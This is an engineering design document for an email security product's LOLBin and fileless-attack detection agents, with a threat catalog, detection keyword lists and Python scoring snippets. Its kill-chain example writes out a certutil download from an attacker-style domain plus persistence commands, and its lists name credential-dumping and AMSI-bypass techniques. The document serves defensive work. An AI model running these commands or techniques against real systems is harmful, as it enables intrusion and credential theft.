# ShopSquire — LOLBin / LOLBAS / Fileless Attack Detection
## Parallel Agent Architecture for Email Endpoint Security
**Date:** 2026-03-28
**Audience:** Engineering + Security architecture

---

## 1. Do We Need ProcMon-Style Detection?

**Short answer: Yes — but not ProcMon itself.**

Process Monitor (Sysinternals) is a forensic investigation tool for an analyst sitting at a machine. You cannot and should not deploy ProcMon in a production email security pipeline. What you DO need is the **telemetry ProcMon captures**, ingested from the right sources:

| ProcMon capability | Production equivalent | ShopSquire source |
|---|---|---|
| Process creation events | Windows Event ID 4688 / Sysmon Event ID 1 | EDR pull (CrowdStrike, Defender) |
| Network connection events | Sysmon Event ID 3 / firewall syslog | existing: `POST /api/v1/security/events/ingest/firewall-syslog` |
| File write events | Sysmon Event ID 11 | EDR pull |
| Registry events | Sysmon Event ID 12/13 | EDR pull |
| DNS queries | Sysmon Event ID 22 / DNS server logs | existing: `POST /api/v1/security/events/ingest/dns-proxy` |
| Parent-child process tree | Sysmon Event ID 1 (ParentProcessId) | EDR pull + sandbox simulation |
| Command line arguments | Event ID 4688 with audit policy / Sysmon | EDR pull + sandbox simulation |
| Image load (DLLs) | Sysmon Event ID 7 | EDR pull |

**For ShopSquire's current architecture**, the right approach is a **two-tier system**:
- **Tier 1 — Isolated sandbox** (already partially built): detonates the attachment in a controlled VM, captures synthetic ProcMon-equivalent telemetry
- **Tier 2 — Real EDR integration** (future): pull live process tree and network events from CrowdStrike Falcon / Microsoft Defender for Endpoint for production confirmation

The current `runtime_evidence_lab.py` is Tier 1 (isolated inert lab). It is **correct and defensible** as a demo/staging platform. The gap is making the sandbox telemetry richer and wiring Tier 2 for production.

---

## 2. The LOLBin / LOLBAS Threat Landscape

### What is LOLBAS?

**LOLBAS (Living Off the Land Binaries, Scripts, and Libraries)** — documented at `lolbas-project.github.io`

These are legitimate Windows components abused by attackers because they:
- Are pre-installed on every Windows machine
- Are signed by Microsoft (bypass application allowlisting)
- Blend with normal admin traffic
- Often whitelisted in legacy EDR/AV

### The Three Categories

| Category | Examples | What attackers use them for |
|---|---|---|
| **LOLBins** — signed executables | `certutil.exe`, `bitsadmin.exe`, `msiexec.exe`, `regsvr32.exe`, `rundll32.exe`, `mshta.exe`, `wmic.exe`, `forfiles.exe`, `pcalua.exe` | Download, execute, decode, bypass |
| **LOLScripts** — signed scripts | `PowerShell.exe`, `wscript.exe`, `cscript.exe`, `msbuild.exe`, `installutil.exe` | Execute arbitrary code, bypass constrained language mode |
| **LOLLibs** — signed DLLs loaded by trusted processes | `comsvcs.dll` (via rundll32 → MiniDump), `sfc_os.dll`, `pcwrun.exe` | Credential dumping, privilege escalation |

### The Classic Macro → LOLBin Kill Chain

This is exactly what the Harbourside XLSM simulates:

```
OUTLOOK.EXE (email client — T1566.001 Spearphishing Attachment)
  └─ EXCEL.EXE opens Harbourside_Acquisition_Details.xlsm
       └─ User clicks "Enable Content"  (T1204.002 User Execution: Malicious File)
            └─ VBA Workbook_Open() executes  (T1059.005 VBS/Macro)
                 └─ powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden  (T1059.001)
                      ├─ certutil.exe -urlcache -split -f http://balashnikovai-cdn.com/stage2.txt
                      │     └─ T1105 — Ingress Tool Transfer (certutil download)
                      │     └─ T1105 — Ingress Tool Transfer
                      ├─ bitsadmin.exe /transfer /download C:\Users\Public\svchost.ps1
                      │     └─ T1197 — BITS Jobs
                      └─ schtasks.exe /create /sc minute /mo 30  (T1053.005 Scheduled Task)
                           └─ svchost.ps1 runs every 30 min  (T1071.004 DNS C2 + T1048.003 DNS Exfil)
```

### Fileless Variants (No Disk Artifacts)

The above chain touches disk (`C:\Users\Public\`). Fileless attacks do not:

```
EXCEL.EXE
  └─ powershell.exe -EncodedCommand [base64]
       └─ [reflection.assembly]::Load([byte[]]) — loads .NET DLL from memory
            └─ Invoke-Expression / IEX — executes without writing to disk
                 └─ WMI subscription created for persistence (T1546.003)
                      └─ Named pipe C2 / HTTPS beacon (T1071.001)
```

**Fileless detection is harder** because there are no file artifacts. Detection requires:
- PowerShell ScriptBlock logging (Event 4104)
- AMSI (Antimalware Scan Interface) telemetry
- WMI activity monitoring (Sysmon Event ID 19/20/21)
- Memory forensics (process hollowing indicators)
- Network-only evidence (beacon pattern, JA3/JA4 fingerprint)

---

## 3. What ShopSquire Currently Has vs Needs

### Current state of `runtime_evidence_lab.py`

The existing parallel swarm has **5 agents** running via `ThreadPoolExecutor`:
1. `_sandbox_agent` — detonation findings
2. `_process_tree_agent` — child-process lineage
3. `_dns_proxy_agent` — DNS/proxy callback
4. `_firewall_agent` — egress behavior
5. `_correlation_agent` — cross-agent evidence gate

**What's missing from each agent:**

| Agent | Current capability | Missing for LOLBin / Fileless |
|---|---|---|
| Sandbox | Returns scenario-mapped strings | No granular per-LOLBin signal extraction, no fileless indicators, no AMSI events |
| Process Tree | Reports child names from scenario contract | No parent-child-grandchild chain scoring, no PPID spoofing detection, no command-line entropy check |
| DNS/Proxy | Returns destination domain | No beacon timing analysis (CV, jitter), no DNS TXT C2 channel check, no DGA scoring |
| Firewall | Returns egress destination | No protocol analysis, no JA3/JA4 fingerprint, no byte-volume regularity scoring |
| Correlation | Aggregates evidence refs | No confidence scoring, no MITRE sub-technique promotion logic, no fileless pathway |

### Missing agents entirely

| Agent | What it would do | Priority |
|---|---|---|
| **LOLBin Chain Scorer** | Score each process in the chain against LOLBAS catalog; output per-binary risk score and ATT&CK technique | HIGH |
| **Command Line Analyzer** | Check PowerShell flags (`-Bypass`, `-Hidden`, `-Enc`), entropy of command string, URL patterns, base64 content | HIGH |
| **Fileless Indicator Agent** | Check for `[reflection.assembly]`, `IEX`, `Invoke-Expression`, `Add-Type`, AMSI bypass strings, memory-only DLL loads | HIGH |
| **Beacon Timing Agent** | Calculate coefficient of variation on connection intervals; flag CV < 0.10 as automated beaconing | MEDIUM |
| **PPID Spoof Detector** | Check if reported parent PID matches actual parent (prevents attackers hiding under legitimate parents) | MEDIUM |
| **Registry Persistence Agent** | Scan for Run key, `CurrentVersion\Run`, scheduled task names, WMI subscriptions | MEDIUM |
| **Credential Access Agent** | Flag access to `LSASS.exe` memory, SAM database, Chrome Login Data, credential manager | HIGH |
| **JA3/JA4 Fingerprint Agent** | Classify TLS connections by client fingerprint; flag known malware fingerprints | LOW |

---

## 4. The Recommended Parallel Agent Architecture

### Design Principles

1. **Fail-fast hypothesis gating**: agents that return no signal should return `no_evidence` not `null`. Correlation agent needs ALL four primary agents to agree before promoting claim_status to `observed`.
2. **Each agent is independent** — runs concurrently, returns a structured `AgentResult` dict
3. **Confidence scoring**: each agent emits a confidence score (0.0–1.0). Correlation agent aggregates with weighted voting.
4. **Evidence lanes**: `passive_artifact_hypothesis` → `runtime_lab_hypothesis` → `runtime_confirmed` → `production_confirmed` (requires real EDR)
5. **No blind promotion**: ATT&CK active tags are only promoted when at least 3 of 4 primary agents agree

### Proposed agent swarm (expanded)

```
EmailAttachment arrives
    |
    v
[STATIC TIER — passive_payload_analysis.py]
    classify_passive_payload()
    |
    +-- lolbin_command_sequence  -->  [RUNTIME TIER — parallel swarm]
    +-- c2_beacon                -->  [RUNTIME TIER — parallel swarm]
    +-- macros                   -->  [RUNTIME TIER — parallel swarm]
    +-- fileless_attack          -->  [RUNTIME TIER — parallel swarm]   (NEW)
    |
    v
ThreadPoolExecutor(max_workers=8)
    |
    +-- Agent 1: SandboxDetonationAgent
    |       detonates in isolated VM
    |       captures: process tree, file writes, registry, network
    |       returns: process_events[], network_events[], file_events[]
    |
    +-- Agent 2: LOLBinChainScorerAgent                              (NEW)
    |       iterates process_events from sandbox
    |       scores each process against LOLBAS catalog
    |       detects: certutil, bitsadmin, schtasks, mshta, rundll32
    |       emits: per_lolbin_risk[], chain_score, chain_mitre_techniques[]
    |
    +-- Agent 3: CommandLineAnalyzerAgent                            (NEW)
    |       analyzes command lines from process_events
    |       checks: -ExecutionPolicy Bypass, -WindowStyle Hidden, -Enc
    |       checks: base64 in args (entropy > 4.5)
    |       checks: URL patterns (http/https/ftp in command args)
    |       emits: obfuscation_score, lolbin_flags[], encoded_command_decoded
    |
    +-- Agent 4: ProcessTreeAgent
    |       builds parent→child→grandchild chain
    |       checks: Office process as root (EXCEL.EXE / WINWORD.EXE)
    |       checks: PPID spoofing (claimed parent ≠ actual parent)
    |       checks: chain depth (>3 suspicious, >5 critical)
    |       emits: chain_depth, suspicious_parent, ppid_spoof_detected
    |
    +-- Agent 5: FilelessIndicatorAgent                              (NEW)
    |       scans command lines and ScriptBlock logs for memory-only patterns
    |       checks: [reflection.assembly]::Load, Add-Type -AssemblyName
    |       checks: IEX / Invoke-Expression, Invoke-Shellcode
    |       checks: WMI subscription creation (T1546.003)
    |       checks: process hollowing (StartAddress ≠ known module base)
    |       emits: fileless_confidence, disk_artifact_present, wmi_persistence
    |
    +-- Agent 6: BeaconTimingAgent                                   (NEW)
    |       analyzes network connection intervals from sandbox/EDR
    |       calculates: mean_interval, std_dev, coefficient_of_variation
    |       flags: CV < 0.10 = regular beaconing (T1071, T1029)
    |       checks: DNS subdomain entropy for DNS tunneling (T1048.003)
    |       emits: beacon_cv, beacon_interval_sec, dns_tunnel_score
    |
    +-- Agent 7: DNSProxyAgent (enhanced)
    |       checks: domain age (< 90 days = suspicious)
    |       checks: TXT record lookups (C2 command channel)
    |       checks: subdomain entropy and length (> 30 chars = tunneling)
    |       checks: ASN reputation (VPS/hosting providers for new domains)
    |       emits: domain_age_days, dns_txt_c2, subdomain_entropy
    |
    +-- Agent 8: RegistryPersistenceAgent                            (NEW)
    |       scans registry events from sandbox
    |       checks: HKLM/HKCU Run keys, RunOnce
    |       checks: Scheduled Task registration
    |       checks: WMI permanent subscription
    |       checks: AppInit_DLLs, Image File Execution Options (IFEO)
    |       emits: persistence_mechanisms[], persistence_mitre_techniques[]
    |
    v
CorrelationAgent (weighted voting)
    |
    requires: 3 of 8 agents flagged = claim_status: "possible" (lab_confirmed)
    requires: 5 of 8 agents flagged = claim_status: "observed" (runtime_confirmed)
    requires: EDR real telemetry = claim_status: "production_confirmed"
    |
    promotes: active MITRE ATT&CK sub-techniques
    produces: confidence_score (0.0-1.0), attack_chain_summary
```

---

## 5. LOLBin Catalog — What to Score Against

The `LOLBinChainScorerAgent` should score against this catalog. Map each binary to its ATT&CK technique:

### High-Risk LOLBins (Score: 9-10)

| Binary | Abuse | ATT&CK ID | Detection signal |
|---|---|---|---|
| `certutil.exe` | `-urlcache -split -f` downloads files | T1105 (+ T1140 when decoding) | `-urlcache` or `-decode` flag |
| `bitsadmin.exe` | `/transfer` downloads + `/SetNotifyCmdLine` persistence | T1197 | `/transfer` + non-Microsoft URL |
| `mshta.exe` | Executes HTA files / remote scripts | T1218.005 | Spawns from Office; remote URL in args |
| `regsvr32.exe` | `/s /u /i` scrobj.dll loads remote scripts | T1218.010 | `scrobj.dll` or remote URL |
| `rundll32.exe` | Loads arbitrary DLLs, `comsvcs.dll MiniDump` | T1218.011 | `MiniDump` or non-system DLL |
| `msiexec.exe` | `/quiet /i http://...` installs remote MSI | T1218.007 | Remote URL in `/i` argument |
| `wmic.exe` | `process call create` executes arbitrary commands | T1047 | `call create` + command string |
| `forfiles.exe` | `/c "cmd /c ..."` executes commands | T1202 | Spawns `cmd.exe` or `powershell.exe` |

### Medium-Risk LOLBins (Score: 6-8)

| Binary | Abuse | ATT&CK ID | Detection signal |
|---|---|---|---|
| `schtasks.exe` | Creates persistence tasks | T1053.005 | `/create` from non-admin process |
| `at.exe` | Legacy task scheduler | T1053.002 | Any use from script context |
| `net.exe` / `net1.exe` | User/group enumeration | T1087 | `user` or `localgroup` subcommand |
| `ipconfig.exe` | Network reconnaissance | T1016 | From Office/script parent |
| `whoami.exe` | Identity check post-compromise | T1033 | From Office/script parent |
| `nltest.exe` | Domain trust enumeration | T1482 | `/domain_trusts` flag |
| `cmd.exe` | Executes batch commands | T1059.003 | Spawned from Office with obfuscated args |

### PowerShell-Specific Flags (T1059.001)

| Flag | Risk | What it means |
|---|---|---|
| `-ExecutionPolicy Bypass` | CRITICAL | Disables execution policy enforcement |
| `-WindowStyle Hidden` | CRITICAL | Hides PowerShell window |
| `-EncodedCommand` / `-Enc` | CRITICAL | Base64 encoded command (obfuscation) |
| `-NonInteractive` / `-NoI` | HIGH | Prevents user prompts |
| `-NoProfile` / `-NoP` | HIGH | Skips profile (removes defensive controls) |
| `-NoExit` | MEDIUM | Keeps shell running (persistence) |
| `-Command` with `IEX` | CRITICAL | Dynamic execution |
| `Invoke-WebRequest` + `IEX` | CRITICAL | Download-and-execute fileless pattern |
| `[Net.WebClient]::DownloadString()` | CRITICAL | HTTP download into memory |
| `[reflection.assembly]::Load()` | CRITICAL | In-memory .NET assembly load (fileless) |

---

## 6. Fileless Attack Detection — The Hard Problem

### Why it's hard

Fileless attacks leave no disk artifacts. Standard AV/signature detection misses them entirely. Detection requires:

1. **Memory scanning** (not viable for ShopSquire without EDR)
2. **Behavioral telemetry** — what the process DID, not what files it created
3. **PowerShell ScriptBlock logging** — Windows logs the deobfuscated script before execution (Event 4104)
4. **AMSI logging** — Windows scans every script/command before execution; AMSI bypass attempts are themselves detectable

### What ShopSquire can detect statically (no endpoint required)

Even without live telemetry, the static payload analysis can flag fileless indicators from attachment content:

```python
# Add to passive_payload_analysis.py fileless_attack hypothesis branch
FILELESS_KEYWORDS = [
    "[reflection.assembly]",
    "::load(",
    "add-type -assemblyname",
    "invoke-shellcode",
    "invoke-mimikatz",
    "invoke-expression",
    "iex(",
    "net.webclient",
    "downloadstring(",
    "downloadfile(",
    "start-sleep",            # timing/evasion
    "amsiutils",              # AMSI bypass attempt
    "[runtime.interopservices.marshal]",  # process hollowing
    "virtualalloc",           # shellcode injection
    "writeprocessmemory",     # process injection
    "createremotethread",     # remote thread injection
    "wmi",                    # WMI persistence
    "win32_process",          # WMI process creation
    "eventfilter",            # WMI event subscription
]
```

### What the FilelessIndicatorAgent detects at runtime

From sandbox detonation (synthetic or real):

| Indicator | Detection method | ATT&CK |
|---|---|---|
| `[reflection.assembly]::Load(byte[])` | ScriptBlock log contains the pattern | T1620 — Reflective Code Loading |
| AMSI bypass via `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')` | ScriptBlock log pattern | T1562.001 — Impair Defenses: Disable AMSI |
| Process hollowing (`NtWriteVirtualMemory` from powershell → external process) | Sysmon Event 8 (CreateRemoteThread) | T1055.012 |
| WMI subscription (`EventFilter` + `EventConsumer`) | Sysmon Event 19/20/21 | T1546.003 |
| PowerShell download to memory (`DownloadString` + `IEX`) | ScriptBlock log | T1059.001 + T1105 |
| Named pipe C2 (`\\.\pipe\*` from injected process) | Sysmon Event 17/18 | T1071.001 |

---

## 7. PPID Spoofing — Why Parent Process Detection Is Not Enough

Sophisticated attackers use **PPID (Parent Process ID) Spoofing** to make malicious processes appear to have a legitimate parent. For example:

- Real chain: `EXCEL.EXE → cmd.exe → malware.exe`
- Spoofed chain: `malware.exe` sets its PPID to `explorer.exe` (PID 1234)
- Process tree shows: `explorer.exe → malware.exe` (looks legitimate)

**Detection method**: Compare reported PPID against actual process creation telemetry from Sysmon Event ID 1. If the claimed parent PID does not match the actual process that called `CreateProcess`, PPID spoofing is occurring.

For ShopSquire's sandbox: the `PPIDSpoofDetector` should compare `scenario.payload.process_tree.parent_pid` against `scenario.payload.process_tree.actual_creator_pid`. If mismatched → flag `ppid_spoof_detected: true` and promote T1134.004 (Access Token Manipulation: Parent PID Spoofing).

---

## 8. Implementation Plan (What to Build, In Order)

### Immediate (unblock detection — Sprint A, already defined)

These are in `ATTACHMENT_DETECTION_GAP_AND_ROADMAP.md`. Do them first:
- FIX-01: `.xlsm` in OOXML extraction branch
- FIX-02: C2 domain keywords in c2_beacon list
- FIX-03: PASTA stages for attachment hypotheses

### Sprint B — Enrich existing agents (2 weeks)

These improve the 5 agents already in `runtime_evidence_lab.py` without restructuring:

**B1: LOLBin chain extraction from sandbox payload**

In `_process_tree_agent()`, replace the generic child-name string with a structured per-binary risk score:

```python
LOLBIN_RISK = {
    "certutil.exe": {"score": 9, "technique": "T1105", "flag_patterns": ["-urlcache", "-decode"]},
    "bitsadmin.exe": {"score": 9, "technique": "T1197", "flag_patterns": ["/transfer", "/SetNotifyCmdLine"]},
    "mshta.exe":     {"score": 9, "technique": "T1218.005", "flag_patterns": ["http://", "https://"]},
    "regsvr32.exe":  {"score": 9, "technique": "T1218.010", "flag_patterns": ["scrobj.dll", "/s /u /i"]},
    "rundll32.exe":  {"score": 8, "technique": "T1218.011", "flag_patterns": ["MiniDump", ".dll,"]},
    "msiexec.exe":   {"score": 8, "technique": "T1218.007", "flag_patterns": ["/quiet", "/i http"]},
    "wmic.exe":      {"score": 8, "technique": "T1047", "flag_patterns": ["call create", "process call"]},
    "schtasks.exe":  {"score": 7, "technique": "T1053.005", "flag_patterns": ["/create", "/sc minute"]},
    "powershell.exe": {"score": 6, "technique": "T1059.001", "flag_patterns": ["-bypass", "-hidden", "-enc"]},
}
```

**B2: Beacon timing CV calculation in `_firewall_agent`**

```python
# Add to _firewall_agent when hypothesis == "c2_beacon"
import statistics
intervals = payload.get("beacon_intervals_sec") or []
if len(intervals) >= 3:
    mean_i = statistics.mean(intervals)
    std_i = statistics.stdev(intervals)
    cv = std_i / mean_i if mean_i else 1.0
    findings.append(
        f"Beacon timing: mean={mean_i:.0f}s, CV={cv:.3f} "
        f"({'CRITICAL: regular beaconing' if cv < 0.10 else 'irregular'}). "
        f"Destination: {payload.get('destination_domain')}."
    )
```

**B3: DNS subdomain entropy check in `_dns_proxy_agent`**

```python
import math
def _subdomain_entropy(domain: str) -> float:
    sub = domain.split(".")[0] if "." in domain else domain
    freq = {c: sub.count(c)/len(sub) for c in set(sub)}
    return -sum(p * math.log2(p) for p in freq.values())

# Flag entropy >= 4.0 as high-entropy DNS label; combine with long-label/TXT evidence for DNS tunneling
entropy = _subdomain_entropy(payload.get("destination_domain") or "")
if entropy > 4.5:
    findings.append(f"DNS subdomain entropy {entropy:.2f} > 4.5 — consistent with base64/encoded exfil (T1048.003).")
```

### Sprint C — Add new agents (4 weeks)

Add three new agents to `runtime_evidence_lab.py` and wire into `ThreadPoolExecutor`:

1. **`_command_line_analyzer_agent`**: scans `process_events[].command_line` for PowerShell flags, `-Enc` + base64 decode, URL patterns. Emits `obfuscation_score`, `encoded_commands_decoded`.

2. **`_fileless_indicator_agent`**: scans ScriptBlock events for in-memory load patterns. Emits `fileless_confidence`, `disk_artifact_present: False`, `wmi_persistence_detected`.

3. **`_registry_persistence_agent`**: scans registry events for Run key / scheduled task creation. Emits `persistence_mechanisms[]`, adds T1547.001, T1053.005 to `possible_mitre_attack`.

Increase `ThreadPoolExecutor(max_workers=8)` to support all 8 agents.

**Update `_correlation_agent` to weighted voting:**

```python
# Weighted confidence scoring
AGENT_WEIGHTS = {
    "Sandbox Detonation Agent": 0.30,
    "LOLBin Chain Scorer Agent": 0.25,
    "Command Line Analyzer Agent": 0.20,
    "Process Tree Agent": 0.15,
    "DNS / Proxy Agent": 0.05,
    "Firewall / NDR Agent": 0.03,
    "Fileless Indicator Agent": 0.01,  # only when fileless_attack hypothesis
    "Registry Persistence Agent": 0.01,
}
# Require weighted_confidence >= 0.60 for "runtime_confirmed"
# Require weighted_confidence >= 0.85 for "production_confirmed" (needs real EDR)
```

### Sprint D — Real EDR integration (6 weeks)

Wire the existing `/api/v1/security/events/pull/crowdstrike` endpoint to actually pull process tree events from CrowdStrike Falcon Endpoint Activity Monitoring API and feed into the agent swarm as real telemetry instead of synthetic scenario contracts.

This is what changes `claim_status` from `lab_confirmed` to `production_confirmed`.

---

## 9. What Each Agent Should Return (Standardised Schema)

All agents must return this structure (enforce via `AgentResult` TypedDict):

```python
class AgentResult(TypedDict):
    agent: str                    # agent name
    status: str                   # "observed" | "no_evidence" | "error"
    verdict_impact: str           # "material" | "supporting" | "none"
    confidence: float             # 0.0 - 1.0
    inspected: str                # what this agent looked at
    findings: list[str]           # human-readable findings (plain English)
    evidence_refs: list[str]      # structured evidence pointers
    mitre_techniques: list[str]   # techniques this agent can confirm
    signals: dict[str, Any]       # structured signal data (for downstream)
    provenance: dict[str, Any]    # source, scenario_id, extraction_method
```

The `signals` dict is the key addition — it lets the `_correlation_agent` do structured reasoning instead of just collecting evidence_refs strings.

---

## 10. Email Endpoint Security — Where ShopSquire Sits

ShopSquire is NOT an EDR. It is an **AI intelligence layer** that sits at the email ingestion point. The right mental model:

```
Email Gateway (MTA)
    |
    v
ShopSquire Email Security Lab
    |
    +-- Static analysis (passive_payload_analysis) — no execution
    +-- Runtime evidence lab (sandbox) — isolated inert execution
    +-- Parallel agent swarm — correlated evidence
    |
    v
Decision: allow / review / contain_and_escalate / block
    |
    +-- Human analyst gate (escalation room)
    +-- Push to EDR (CrowdStrike IOC management API) — future
    +-- Push to SIEM (Splunk / Microsoft Sentinel) — future
    +-- Push to SOAR (automated containment) — future
```

ShopSquire detects and triages at the EMAIL layer before the file reaches the endpoint. That is the right shift-left position. ProcMon-style telemetry is what happens AFTER the file reaches the endpoint — ShopSquire's job is to prevent that from happening by catching it earlier.

**The three detection windows:**

| Window | Where | Tool | ShopSquire role |
|---|---|---|---|
| Pre-delivery | Email gateway | Static analysis | Primary — block/quarantine before delivery |
| Pre-execution | Endpoint (on open) | Macro policy, Protected View | Education/policy guidance (via escalation room) |
| Post-execution | Endpoint (EDR) | CrowdStrike / Defender | Pull telemetry to confirm/promote findings |

---

## 11. Practical Next Steps (Prioritised)

| Priority | Action | File | Effort |
|---|---|---|---|
| P0 | Apply FIX-01/02/03 from gap roadmap | `email_attachment_parser.py`, `passive_payload_analysis.py` | 1 day |
| P0 | Add `fileless_attack` as new hypothesis in `passive_payload_analysis.py` | `passive_payload_analysis.py` | 1 day |
| P1 | Add LOLBIN_RISK catalog and per-binary scoring to `_process_tree_agent` | `runtime_evidence_lab.py` | 2 days |
| P1 | Add beacon CV calculation to `_firewall_agent` | `runtime_evidence_lab.py` | 1 day |
| P1 | Add DNS subdomain entropy to `_dns_proxy_agent` | `runtime_evidence_lab.py` | 0.5 day |
| P1 | Add fileless keyword branch to `passive_payload_analysis.py` | `passive_payload_analysis.py` | 1 day |
| P2 | Add `_command_line_analyzer_agent` as new parallel agent | `runtime_evidence_lab.py` | 3 days |
| P2 | Add `_fileless_indicator_agent` as new parallel agent | `runtime_evidence_lab.py` | 3 days |
| P2 | Add `_registry_persistence_agent` as new parallel agent | `runtime_evidence_lab.py` | 2 days |
| P2 | Standardise `AgentResult` TypedDict across all agents | `runtime_evidence_lab.py` | 1 day |
| P2 | Weighted confidence scoring in `_correlation_agent` | `runtime_evidence_lab.py` | 2 days |
| P3 | Real CrowdStrike process tree pull | `vendor_connectors.py` | 1 week |
| P3 | PPID spoof detection in `_process_tree_agent` | `runtime_evidence_lab.py` | 3 days |
| P3 | Supply chain XLSM scenario (SC-07) in `supply_chain_scenarios.py` | `supply_chain_scenarios.py` | 2 days |

---

## 12. What ShopSquire Should NOT Build

| Do not build | Why | Alternative |
|---|---|---|
| ProcMon itself | It's a forensic tool, not a pipeline component | Ingest Sysmon/EDR telemetry instead |
| Live malware detonation | Too risky, legal exposure, out of scope | Keep sandbox as isolated inert lab; point to Cuckoo/ANY.RUN for real detonation |
| Kernel-level process hook | Requires EDR agent on every endpoint | Use CrowdStrike Falcon agent — it already does this |
| Full SIEM | Not ShopSquire's job | Push findings to Splunk/Sentinel via syslog or API |
| Antivirus signature engine | Commodity; already solved | Call external AV API (VirusTotal, MetaDefender) as a sub-agent |

---

*Generated: 2026-03-28 | Covers: LOLBin, LOLBAS, fileless attacks, PPID spoofing, parallel agent architecture, email endpoint security positioning*
